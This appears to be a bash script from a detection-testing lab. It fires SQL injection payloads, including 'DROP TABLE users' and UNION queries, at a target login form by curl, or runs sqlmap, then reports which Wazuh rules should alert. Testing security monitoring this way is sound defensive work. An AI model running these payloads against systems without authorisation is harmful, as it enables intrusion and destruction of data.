#!/bin/bash
#===============================================================================
# Attack #11: SQL Injection Attempts
# Category: Web Attack
# Expected Wazuh Rules: 31101 (lvl5), 30309 (lvl5), 30310 (lvl10)
# Expected Level: 5-10 (observed)
# MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
#===============================================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../scripts/config.env" 2>/dev/null || true

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

ATTACK_ID="11"
ATTACK_NAME="SQL Injection Attempts"
ATTACK_CATEGORY="Web Attack"

TARGET="${1:-$TARGET_IP}"
WEB_PORT="${2:-80}"
TARGET_PATH="${3:-/login}"
MODE="${4:-basic}" # basic | sqlmap

if [ -z "$TARGET" ]; then
    echo -e "${RED}Error: No target IP specified${NC}"
    echo "Usage: $0 <target_ip> [web_port] [path]"
    exit 1
fi

echo "==============================================================================="
echo -e "${YELLOW}ATTACK #${ATTACK_ID}: ${ATTACK_NAME}${NC}"
echo "==============================================================================="
echo "Target: http://$TARGET:$WEB_PORT$TARGET_PATH"
echo "Mode: $MODE"
echo "Category: $ATTACK_CATEGORY"
echo ""

START_TIME=$(date +%s.%N)
START_TIMESTAMP=$(date -Iseconds)

echo -e "${GREEN}[*] Attack started at: $START_TIMESTAMP${NC}"
echo "[*] Sending SQL injection payloads..."
echo ""

PAYLOADS=(
    "' OR '1'='1"
    "admin' --"
    "admin') OR ('1'='1"
    "1; DROP TABLE users; --"
    "' UNION SELECT null, version() --"
    "' UNION SELECT null, user() --"
)

URL="http://$TARGET:$WEB_PORT$TARGET_PATH"
echo "[*] Target URL: $URL"

if command -v sqlmap >/dev/null 2>&1 && [ "$MODE" = "sqlmap" ]; then
    echo "[*] sqlmap mode: quick scan"
    sqlmap -u "$URL" --batch --random-agent --risk=1 --level=1 --technique=BEUST --smart --threads=2 || true
else
    echo "[*] curl mode: replaying common SQLi payloads"
    for p in "${PAYLOADS[@]}"; do
        echo "[*] Sending payload: $p"
        curl -X POST "$URL" \
            -H 'Content-Type: application/x-www-form-urlencoded' \
            --data "username=admin&password=$p" \
            --max-time 5 \
            -s -o /dev/null
        sleep 1
    done
fi

END_TIME=$(date +%s.%N)
END_TIMESTAMP=$(date -Iseconds)
DURATION=$(echo "$END_TIME - $START_TIME" | bc)

echo ""
echo "==============================================================================="
echo -e "${GREEN}[✓] Attack completed${NC}"
echo "==============================================================================="
echo "End Time: $END_TIMESTAMP"
echo "Duration: ${DURATION} seconds"
echo ""
echo "Expected Wazuh alerts:"
echo "  - SQL injection attempts (rules 31101/31102/31103)"
echo "  - Web application attack detections"
echo ""
echo "Data for CSV:"
echo "  attack_id: $ATTACK_ID"
echo "  attack_name: $ATTACK_NAME"
echo "  category: $ATTACK_CATEGORY"
echo "  attack_start_time: $START_TIMESTAMP"
echo "  attack_end_time: $END_TIMESTAMP"
